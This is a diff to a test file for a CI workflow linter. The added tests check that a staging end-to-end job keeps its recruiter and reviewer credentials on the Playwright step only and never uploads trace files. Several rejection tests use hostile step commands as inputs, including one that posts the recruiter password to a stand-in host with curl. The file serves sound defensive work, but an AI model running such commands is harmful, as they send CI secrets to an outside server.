@@ -10,6 +10,17 @@ import {
   E2E_IF,
   E2E_JOB,
   E2E_MAX_MINUTES,
+  E2E_STAGING_ARTIFACT_PATHS,
+  E2E_STAGING_IF,
+  E2E_STAGING_JOB,
+  E2E_STAGING_MAX_MINUTES,
+  E2E_STAGING_ONLY_ENV,
+  E2E_STAGING_PLAYWRIGHT_ENV,
+  E2E_STAGING_PREFLIGHT_CMD,
+  E2E_STAGING_PREFLIGHT_ENV,
+  E2E_STAGING_RUN_CMD,
+  E2E_STAGING_SECRET_USERS,
+  STAGING_SECRET_USERS,
   PAGES_STEP_LINES,
   BUILD_ONLY_ENV,
   DEPLOY_GUARD_ENV,
@@ -136,7 +147,16 @@ describe('parseYaml (the subset GitHub workflows use)', () => {
 
   it('reads the fixture workflow', () => {
     const d = doc();
-    expect(Object.keys(d.jobs)).toEqual([...REQUIRED_JOBS, 'e2e-local', 'deploy-staging']);
+    expect(Object.keys(d.jobs)).toEqual([
+      ...REQUIRED_JOBS,
+      'e2e-local',
+      'deploy-staging',
+      'e2e-staging',
+    ]);
+    // The upload path's exclusion line is block-scalar text, not a YAML tag.
+    expect(d.jobs['e2e-staging'].steps[6].with.path).toBe(
+      'e2e/test-results\n!e2e/test-results/**/trace.zip\n',
+    );
     expect(d.on.workflow_dispatch.inputs.run_e2e).toEqual({
       description: 'Run the e2e jobs',
       type: 'boolean',
@@ -713,14 +733,32 @@ describe('checkWorkflow', () => {
           // Workers with --var from GitHub variables (never secrets) and checked first
           'CANDIDATE_TOKEN_KID',
           'CANDIDATE_TOKEN_PUBLIC_JWK',
+          // d1 §7.1, AT-D1 (R5): the e2e-staging contract, its preflight and Playwright steps only
+          'E2E_STAGING',
+          'E2E_CANDIDATE_URL',
+          'E2E_RECRUITER_URL',
+          'E2E_API_URL',
+          'E2E_EDGE_URL',
+          'E2E_SUPABASE_URL',
+          'E2E_SUPABASE_PUBLISHABLE_KEY',
+          'E2E_SHA',
+          'E2E_RECRUITER_EMAIL',
+          'E2E_RECRUITER_PASSWORD',
+          'E2E_RECRUITER_TOTP_SECRET',
+          'E2E_REVIEWER_EMAIL',
+          'E2E_REVIEWER_PASSWORD',
+          'E2E_REVIEWER_TOTP_SECRET',
         ].sort(),
       );
     });
 
     it('accepts every listed name at every level', () => {
-      // the build-only names have their own rule (deploy build step only), tested below
+      // the build-only and e2e-staging-only names have their own rules (one job's steps only),
+      // tested below
       const all = Object.fromEntries(
-        ENV_ALLOW_LIST.filter((n) => !Object.hasOwn(BUILD_ONLY_ENV, n)).map((n) => [n, 'x']),
+        ENV_ALLOW_LIST.filter(
+          (n) => !Object.hasOwn(BUILD_ONLY_ENV, n) && !E2E_STAGING_ONLY_ENV.includes(n),
+        ).map((n) => [n, 'x']),
       );
       const d = doc();
       d.env = { ...all, MIGRATIONS_BASE: 'origin/main' };
@@ -2305,6 +2343,403 @@ describe('e2e-local job (d1 §7.1, DC-D9)', () => {
   });
 });
 
+// d1 §7.1, AT-D1, AT-D20 (stream R5): the slice spec against staging, after deploy-staging, on a
+// manual dispatch from d1/** or milestone/** with run_e2e. The six E2E credentials sit only on the
+// Playwright step, the preflight gets the public contract only, and the artifact never holds a trace.
+describe('e2e-staging job (d1 §7.1, AT-D1, AT-D20)', () => {
+  const job = (d) => d.jobs[E2E_STAGING_JOB];
+  const steps = (d) => job(d).steps;
+  const at = (d, re) => steps(d).findIndex((s) => re.test(s.run ?? s.uses ?? ''));
+  const step = (d, re) => steps(d)[at(d, re)];
+  const PREFLIGHT = /e2e:staging:preflight/;
+  const PLAYWRIGHT = /playwright test/;
+  const UPLOAD = /upload-artifact/;
+  const check = (mutate) => {
+    const d = doc();
+    mutate(d);
+    return msgs(checkWorkflow(d, 'ci.yml', ctx));
+  };
+  const S = (name) => `\${{ secrets.${name} }}`;
+  const V = (name) => `\${{ vars.${name} }}`;
+  const PUBLIC = {
+    E2E_CANDIDATE_URL: 'https://trace-candidate-staging.pages.dev',
+    E2E_RECRUITER_URL: 'https://trace-recruiter-staging.pages.dev',
+    E2E_API_URL: 'https://trace-api-staging.abhayraj.workers.dev',
+    E2E_EDGE_URL: 'https://trace-edge-staging.abhayraj.workers.dev',
+    E2E_SUPABASE_URL: V('SUPABASE_STAGING_URL'),
+    E2E_SUPABASE_PUBLISHABLE_KEY: V('SUPABASE_STAGING_PUBLISHABLE_KEY'),
+    E2E_SHA: '${{ github.sha }}',
+  };
+
+  it('pins the job id, the condition, the commands, the env contract and the artifact', () => {
+    expect(E2E_STAGING_JOB).toBe('e2e-staging');
+    // The dispatch half of DEPLOY_IF, with run_e2e: never a push, never a pull request.
+    expect(E2E_STAGING_IF).toBe(
+      "github.event_name == 'workflow_dispatch' && inputs.run_e2e && (startsWith(github.ref, 'refs/heads/d1/') || startsWith(github.ref, 'refs/heads/milestone/')) && github.repository == 'TraceHiring/TraceHiring'",
+    );
+    expect(E2E_STAGING_MAX_MINUTES).toBe(25);
+    expect(E2E_STAGING_PREFLIGHT_CMD).toBe('pnpm e2e:staging:preflight');
+    expect(E2E_STAGING_RUN_CMD).toBe(
+      'pnpm --filter @trace/e2e exec playwright test tests/d1-slice.spec.ts --project staging',
+    );
+    expect(E2E_STAGING_PREFLIGHT_ENV).toEqual(PUBLIC);
+    expect(E2E_STAGING_PLAYWRIGHT_ENV).toEqual({
+      E2E_STAGING: '1',
+      ...PUBLIC,
+      E2E_RECRUITER_EMAIL: S('STAGING_SMOKE_EMAIL'),
+      E2E_RECRUITER_PASSWORD: S('STAGING_SMOKE_PASSWORD'),
+      E2E_RECRUITER_TOTP_SECRET: S('STAGING_SMOKE_TOTP_SECRET'),
+      E2E_REVIEWER_EMAIL: S('STAGING_REVIEWER_EMAIL'),
+      E2E_REVIEWER_PASSWORD: S('STAGING_REVIEWER_PASSWORD'),
+      E2E_REVIEWER_TOTP_SECRET: S('STAGING_REVIEWER_TOTP_SECRET'),
+    });
+    expect([...E2E_STAGING_ONLY_ENV].sort()).toEqual(
+      Object.keys(E2E_STAGING_PLAYWRIGHT_ENV).sort(),
+    );
+    expect([...E2E_STAGING_ARTIFACT_PATHS]).toEqual([
+      'e2e/test-results',
+      '!e2e/test-results/**/trace.zip',
+    ]);
+    // The six credentials, each bound to the Playwright command only; the reviewer's never reach
+    // deploy-staging, and no deploy secret reaches e2e-staging.
+    expect(Object.keys(E2E_STAGING_SECRET_USERS).sort()).toEqual(
+      [
+        'STAGING_SMOKE_EMAIL',
+        'STAGING_SMOKE_PASSWORD',
+        'STAGING_SMOKE_TOTP_SECRET',
+        'STAGING_REVIEWER_EMAIL',
+        'STAGING_REVIEWER_PASSWORD',
+        'STAGING_REVIEWER_TOTP_SECRET',
+      ].sort(),
+    );
+    for (const users of Object.values(E2E_STAGING_SECRET_USERS)) {
+      expect(users.some((re) => re.test(E2E_STAGING_RUN_CMD))).toBe(true);
+      expect(users.some((re) => re.test(`${E2E_STAGING_RUN_CMD} --trace on`))).toBe(false);
+      expect(users.some((re) => re.test(E2E_STAGING_PREFLIGHT_CMD))).toBe(false);
+    }
+    for (const name of Object.keys(STAGING_SECRET_USERS))
+      expect(name).not.toMatch(/^STAGING_REVIEWER_/);
+    expect(job(doc()).if).toBe(E2E_STAGING_IF);
+    expect(check(() => {})).toBe('');
+  });
+
+  it('accepts needs: as a one-item list and environment: as a mapping', () => {
+    expect(
+      check((d) => {
+        job(d).needs = ['deploy-staging'];
+        job(d).environment = { name: 'staging' };
+      }),
+    ).toBe('');
+  });
+
+  it.each([
+    ['no if', (j) => delete j.if],
+    ['always()', (j) => (j.if = 'always()')],
+    ['the whole deploy condition (a push to main)', (j) => (j.if = DEPLOY_IF)],
+    [
+      'a dispatch without run_e2e',
+      (j) =>
+        (j.if =
+          "github.event_name == 'workflow_dispatch' && (startsWith(github.ref, 'refs/heads/d1/') || startsWith(github.ref, 'refs/heads/milestone/')) && github.repository == 'TraceHiring/TraceHiring'"),
+    ],
+    [
+      'a dispatch from any branch',
+      (j) =>
+        (j.if =
+          "github.event_name == 'workflow_dispatch' && inputs.run_e2e && github.repository == 'TraceHiring/TraceHiring'"),
+    ],
+    [
+      'a dispatch from main',
+      (j) =>
+        (j.if =
+          "github.event_name == 'workflow_dispatch' && inputs.run_e2e && (startsWith(github.ref, 'refs/heads/d1/') || github.ref == 'refs/heads/main') && github.repository == 'TraceHiring/TraceHiring'"),
+    ],
+    [
+      'any repository',
+      (j) =>
+        (j.if =
+          "github.event_name == 'workflow_dispatch' && inputs.run_e2e && (startsWith(github.ref, 'refs/heads/d1/') || startsWith(github.ref, 'refs/heads/milestone/'))"),
+    ],
+    ['the e2e-local condition (pull requests)', (j) => (j.if = E2E_IF)],
+  ])('rejects %s', (_label, edit) => {
+    expect(check((d) => edit(job(d)))).toMatch(/e2e-staging must have exactly if:/);
+  });
+
+  it.each([
+    ['no needs', (j) => delete j.needs],
+    ['the required jobs instead', (j) => (j.needs = [...REQUIRED_JOBS])],
+    ['deploy-staging and another job', (j) => (j.needs = ['deploy-staging', 'e2e-local'])],
+    ['e2e-local', (j) => (j.needs = 'e2e-local')],
+  ])('runs only after deploy-staging: rejects %s', (_label, edit) => {
+    expect(check((d) => edit(job(d)))).toMatch(/e2e-staging must have needs: deploy-staging/);
+  });
+
+  it.each([
+    ['no environment', (j) => delete j.environment],
+    ['production', (j) => (j.environment = 'production')],
+    ['another name in a mapping', (j) => (j.environment = { name: 'prod' })],
+  ])('uses the staging environment: rejects %s', (_label, edit) => {
+    expect(check((d) => edit(job(d)))).toMatch(/e2e-staging must use environment: staging/);
+  });
+
+  it.each([
+    ['no permissions', (j) => delete j.permissions],
+    ['none at all', (j) => (j.permissions = {})],
+  ])('sets read-only permissions explicitly: rejects %s', (_label, edit) => {
+    expect(check((d) => edit(job(d)))).toMatch(
+      /e2e-staging must set permissions: \{ contents: read \}/,
+    );
+  });
+
+  it('rejects a time limit over 25 minutes, another runner, a container or services', () => {
+    expect(check((d) => (job(d)['timeout-minutes'] = 30))).toMatch(
+      /e2e-staging must set timeout-minutes: 1 to 25/,
+    );
+    expect(check((d) => delete job(d)['timeout-minutes'])).toMatch(
+      /e2e-staging must set timeout-minutes/,
+    );
+    expect(check((d) => (job(d)['runs-on'] = 'self-hosted'))).toMatch(
+      /e2e-staging must run on ubuntu-24.04/,
+    );
+    expect(check((d) => (job(d).container = 'node:22'))).toMatch(
+      /e2e-staging may not use container: or services:/,
+    );
+    expect(check((d) => (job(d).services = { db: { image: 'postgres' } }))).toMatch(
+      /e2e-staging may not use container: or services:/,
+    );
+  });
+
+  describe('secrets only on the Playwright step', () => {
+    it('rejects a credential on the preflight step', () => {
+      const m = check(
+        (d) => (step(d, PREFLIGHT).env.E2E_RECRUITER_PASSWORD = S('STAGING_SMOKE_PASSWORD')),
+      );
+      expect(m).toMatch(/e2e-staging\.steps\[4\].*STAGING_SMOKE_PASSWORD.*does not use it/);
+      expect(m).toMatch(/e2e-staging\.steps\[4\].*env: must be exactly/);
+    });
+
+    it('rejects a reviewer credential on the Chromium install step', () => {
+      expect(
+        check(
+          (d) =>
+            (step(d, /playwright install/).env = {
+              E2E_REVIEWER_TOTP_SECRET: S('STAGING_REVIEWER_TOTP_SECRET'),
+            }),
+        ),
+      ).toMatch(/e2e-staging\.steps\[3\].*STAGING_REVIEWER_TOTP_SECRET.*does not use it/);
+    });
+
+    it('rejects a reviewer credential anywhere in deploy-staging, even on the smoke step', () => {
+      expect(
+        check((d) => {
+          const s = d.jobs['deploy-staging'].steps;
+          s[s.length - 1].env.E2E_REVIEWER_PASSWORD = S('STAGING_REVIEWER_PASSWORD');
+        }),
+      ).toMatch(/deploy-staging\.steps\[\d+\].*STAGING_REVIEWER_PASSWORD is not on the/);
+    });
+
+    it('rejects a deploy secret (or any other) on the Playwright step', () => {
+      for (const name of ['CLOUDFLARE_API_TOKEN', 'SUPABASE_STAGING_DB_URL', 'OTHER']) {
+        expect(
+          check((d) => (step(d, PLAYWRIGHT).env.E2E_SHA = S(name))),
+          name,
+        ).toMatch(new RegExp(`e2e-staging\\.steps\\[5\\].*secret ${name} is not on the`));
+      }
+      expect(check((d) => (step(d, PLAYWRIGHT).env.E2E_SHA = '${{ github.token }}'))).toMatch(
+        /e2e-staging\.steps\[5\].*GITHUB_TOKEN/,
+      );
+    });
+
+    it('rejects a credential at job level, in with: or in an if:', () => {
+      expect(
+        check((d) => (job(d).env = { E2E_RECRUITER_EMAIL: S('STAGING_SMOKE_EMAIL') })),
+      ).toMatch(/jobs\.e2e-staging.*found in env:/);
+      expect(check((d) => (step(d, UPLOAD).with.name = S('STAGING_SMOKE_EMAIL')))).toMatch(
+        /e2e-staging\.steps\[6\].*STAGING_SMOKE_EMAIL.*does not use it/,
+      );
+      expect(check((d) => (step(d, PLAYWRIGHT).if = "secrets.STAGING_SMOKE_EMAIL != ''"))).toMatch(
+        /e2e-staging\.steps\[5\].*only in env: or with:/,
+      );
+    });
+
+    it('rejects swapped or missing credentials on the Playwright step', () => {
+      expect(
+        check((d) => {
+          const env = step(d, PLAYWRIGHT).env;
+          env.E2E_RECRUITER_PASSWORD = S('STAGING_REVIEWER_PASSWORD');
+          env.E2E_REVIEWER_PASSWORD = S('STAGING_SMOKE_PASSWORD');
+        }),
+      ).toMatch(/e2e-staging\.steps\[5\].*env: must be exactly/);
+      expect(check((d) => delete step(d, PLAYWRIGHT).env.E2E_REVIEWER_EMAIL)).toMatch(
+        /e2e-staging\.steps\[5\].*env: must be exactly/,
+      );
+    });
+
+    it('rejects a credential on a step that runs more than the Playwright command', () => {
+      for (const run of [
+        `${E2E_STAGING_RUN_CMD} --trace on`,
+        `${E2E_STAGING_RUN_CMD}; curl https://x.example.test`,
+        `curl -d "p=$E2E_RECRUITER_PASSWORD" https://x.example.test\n# ${E2E_STAGING_RUN_CMD}`,
+        'pnpm --filter @trace/e2e exec playwright test --project staging',
+      ]) {
+        expect(
+          check((d) => (step(d, PLAYWRIGHT).run = run)),
+          run,
+        ).toMatch(/STAGING_SMOKE_PASSWORD.*does not use it/);
+      }
+    });
+  });
+
+  describe('the public contract', () => {
+    it.each([
+      ['another api origin', 'E2E_API_URL', 'https://trace-api-staging.other.workers.dev'],
+      ['an http edge origin', 'E2E_EDGE_URL', 'http://trace-edge-staging.abhayraj.workers.dev'],
+      [
+        'a preview candidate URL',
+        'E2E_CANDIDATE_URL',
+        'https://abc.trace-candidate-staging.pages.dev',
+      ],
+      ['the Supabase URL as a literal', 'E2E_SUPABASE_URL', 'https://example.supabase.co'],
+      ['the publishable key from a secret', 'E2E_SUPABASE_PUBLISHABLE_KEY', S('X')],
+      ['the SHA from an input', 'E2E_SHA', '${{ github.event.inputs.sha }}'],
+    ])('rejects %s on either step', (_label, name, value) => {
+      for (const re of [PREFLIGHT, PLAYWRIGHT]) {
+        const i = at(doc(), re);
+        expect(check((d) => (step(d, re).env[name] = value))).toMatch(
+          new RegExp(`e2e-staging\\.steps\\[${i}\\].*env: must be exactly`),
+        );
+      }
+    });
+
+    it('rejects E2E_STAGING off or on the preflight step', () => {
+      expect(check((d) => (step(d, PLAYWRIGHT).env.E2E_STAGING = '0'))).toMatch(
+        /steps\[5\].*env: must be exactly/,
+      );
+      expect(check((d) => (step(d, PREFLIGHT).env.E2E_STAGING = '1'))).toMatch(
+        /steps\[4\].*env: must be exactly/,
+      );
+    });
+
+    it('rejects an e2e-staging name anywhere else (another job, the workflow, job env)', () => {
+      expect(
+        check((d) => (d.jobs['e2e-local'].steps[4].env = { E2E_SHA: '${{ github.sha }}' })),
+      ).toMatch(/jobs\.e2e-local\.steps\[4\].*E2E_SHA may be set only on the e2e-staging/);
+      expect(
+        check((d) => (d.env.E2E_API_URL = 'https://trace-api-staging.abhayraj.workers.dev')),
+      ).toMatch(/ci\.yml \(env\).*E2E_API_URL may be set only on the e2e-staging/);
+      expect(check((d) => (job(d).env = { E2E_STAGING: '1' }))).toMatch(
+        /jobs\.e2e-staging.*E2E_STAGING may be set only on the e2e-staging/,
+      );
+      expect(
+        check((d) => (d.jobs['deploy-staging'].steps[4].env.E2E_SHA = '${{ github.sha }}')),
+      ).toMatch(/deploy-staging\.steps\[4\].*E2E_SHA may be set only on the e2e-staging/);
+    });
+
+    it('rejects the names in a local action step', () => {
+      const a = parseYaml(ACTION);
+      a.runs.steps[2].env = { E2E_RECRUITER_URL: 'https://trace-recruiter-staging.pages.dev' };
+      expect(msgs(checkAction(a, 'action.yml'))).toMatch(
+        /E2E_RECRUITER_URL may be set only on the e2e-staging/,
+      );
+    });
+  });
+
+  describe('no trace, and only the test results, kept 7 days', () => {
+    it('refuses E2E_TRACE anywhere (it is on no allow-list)', () => {
+      expect(check((d) => (step(d, PLAYWRIGHT).env.E2E_TRACE = '1'))).toMatch(
+        /steps\[5\].*env: may not set E2E_TRACE/,
+      );
+    });
+
+    it.each([
+      ['no trace exclusion', (w) => (w.path = 'e2e/test-results\n')],
+      ['the HTML report too', (w) => (w.path = `${w.path}e2e/playwright-report\n`)],
+      ['the whole e2e folder', (w) => (w.path = 'e2e\n!e2e/test-results/**/trace.zip\n')],
+      ['30 days', (w) => (w['retention-days'] = 30)],
+      ['no retention', (w) => delete w['retention-days']],
+      ['a string retention', (w) => (w['retention-days'] = '7')],
+      ['no path', (w) => delete w.path],
+      ['hidden files', (w) => (w['include-hidden-files'] = true)],
+    ])('rejects an artifact with %s', (_label, edit) => {
+      expect(check((d) => edit(step(d, UPLOAD).with))).toMatch(
+        /e2e-staging must upload exactly e2e\/test-results without trace\.zip/,
+      );
+    });
+
+    it('uploads even when the tests fail, after the Playwright step, exactly once', () => {
+      expect(check((d) => delete step(d, UPLOAD).if)).toMatch(
+        /e2e-staging must upload exactly.*if: always\(\)/,
+      );
+      expect(check((d) => (step(d, UPLOAD).if = 'failure()'))).toMatch(
+        /e2e-staging must upload exactly.*if: always\(\)/,
+      );
+      expect(
+        check((d) => steps(d).splice(at(d, PLAYWRIGHT), 0, steps(d).splice(at(d, UPLOAD), 1)[0])),
+      ).toMatch(/e2e-staging must upload exactly.*after the Playwright step/);
+      expect(check((d) => steps(d).push({ ...step(d, UPLOAD) }))).toMatch(
+        /e2e-staging must upload exactly/,
+      );
+      expect(check((d) => steps(d).splice(at(d, UPLOAD), 1))).toMatch(
+        /e2e-staging must upload exactly/,
+      );
+    });
+  });
+
+  describe('the step list', () => {
+    it.each([
+      ['no preflight', (d) => steps(d).splice(at(d, PREFLIGHT), 1)],
+      [
+        'the preflight after Playwright',
+        (d) => steps(d).splice(at(d, UPLOAD), 0, steps(d).splice(at(d, PREFLIGHT), 1)[0]),
+      ],
+      ['a preflight with an if:', (d) => (step(d, PREFLIGHT).if = 'false')],
+      ['a preflight that ignores failure', (d) => (step(d, PREFLIGHT).run += ' || true')],
+      ['a second preflight', (d) => steps(d).push({ ...step(d, PREFLIGHT) })],
+    ])('requires one preflight before Playwright: rejects %s', (_label, edit) => {
+      expect(check(edit)).toMatch(
+        /e2e-staging must run exactly pnpm e2e:staging:preflight in one step with no if:, before the Playwright step/,
+      );
+    });
+
+    it.each([
+      ['no Playwright step', (d) => steps(d).splice(at(d, PLAYWRIGHT), 1)],
+      ['a Playwright step with an if:', (d) => (step(d, PLAYWRIGHT).if = 'false')],
+      ['a second Playwright step', (d) => steps(d).push({ ...step(d, PLAYWRIGHT) })],
+      [
+        'the local project',
+        (d) => (step(d, PLAYWRIGHT).run = E2E_STAGING_RUN_CMD.replace('staging', 'local')),
+      ],
+    ])('requires one Playwright step: rejects %s', (_label, edit) => {
+      expect(check(edit)).toMatch(
+        /e2e-staging must run exactly pnpm --filter @trace\/e2e exec playwright test tests\/d1-slice\.spec\.ts --project staging in one step with no if:/,
+      );
+    });
+
+    it.each([
+      ['an extra command', { run: 'curl https://x.example.test' }],
+      ['the deploy smoke', { run: 'node scripts/smoke-staging-auth.mjs' }],
+      ['an unpinned action', { uses: `actions/github-script@${SHA}` }],
+      ['a working-directory', null],
+    ])('allows only the pinned steps: rejects %s', (_label, extra) => {
+      expect(
+        check((d) => {
+          if (extra === null) step(d, PLAYWRIGHT)['working-directory'] = 'e2e';
+          else steps(d).splice(1, 0, extra);
+        }),
+      ).toMatch(/e2e-staging may only/);
+    });
+
+    it('requires the run_e2e dispatch input even without e2e-local', () => {
+      expect(
+        check((d) => {
+          delete d.jobs['e2e-local'];
+          d.on.workflow_dispatch = null;
+        }),
+      ).toMatch(/workflow_dispatch must declare exactly one input, run_e2e/);
+    });
+  });
+});
+
 describe('the real ci.yml deploy chain (d1 §7.1)', () => {
   const REPO_ROOT = fileURLToPath(new URL('../../', import.meta.url));
   const real = parseYaml(
@@ -2347,6 +2782,30 @@ describe('the real ci.yml deploy chain (d1 §7.1)', () => {
     expect(real.on.workflow_dispatch.inputs).toEqual({
       run_e2e: expect.objectContaining({ type: 'boolean', default: true }),
     });
+    expect(checkWorkflow(real, 'ci.yml', ctx)).toEqual([]);
+  });
+
+  it('runs the slice spec against staging after the deploy, on a d1/** or milestone/** dispatch with run_e2e', () => {
+    const e2e = real.jobs[E2E_STAGING_JOB];
+    expect(Object.keys(real.jobs).slice(-2)).toEqual(['deploy-staging', E2E_STAGING_JOB]);
+    expect(e2e.needs).toBe('deploy-staging');
+    expect(e2e.if).toBe(E2E_STAGING_IF);
+    expect(e2e.environment).toBe('staging');
+    expect(e2e.permissions).toEqual({ contents: 'read' });
+    expect(e2e['timeout-minutes']).toBeLessThanOrEqual(E2E_STAGING_MAX_MINUTES);
+    const runs = e2e.steps.map((s) => s.run).filter((r) => r !== undefined);
+    expect(runs).toEqual([
+      'pnpm --filter @trace/e2e exec playwright install --with-deps chromium',
+      E2E_STAGING_PREFLIGHT_CMD,
+      E2E_STAGING_RUN_CMD,
+    ]);
+    const pre = e2e.steps.find((s) => s.run === E2E_STAGING_PREFLIGHT_CMD);
+    const pw = e2e.steps.find((s) => s.run === E2E_STAGING_RUN_CMD);
+    expect(pre.env).toEqual(E2E_STAGING_PREFLIGHT_ENV);
+    expect(pw.env).toEqual(E2E_STAGING_PLAYWRIGHT_ENV);
+    // Only the Playwright step holds a secret.
+    expect(e2e.steps.filter((s) => secretRefs(s).length > 0)).toEqual([pw]);
+    expect(JSON.stringify(e2e)).not.toMatch(/E2E_TRACE|--trace/);
     expect(checkWorkflow(real, 'ci.yml', ctx)).toEqual([]);
   });
 
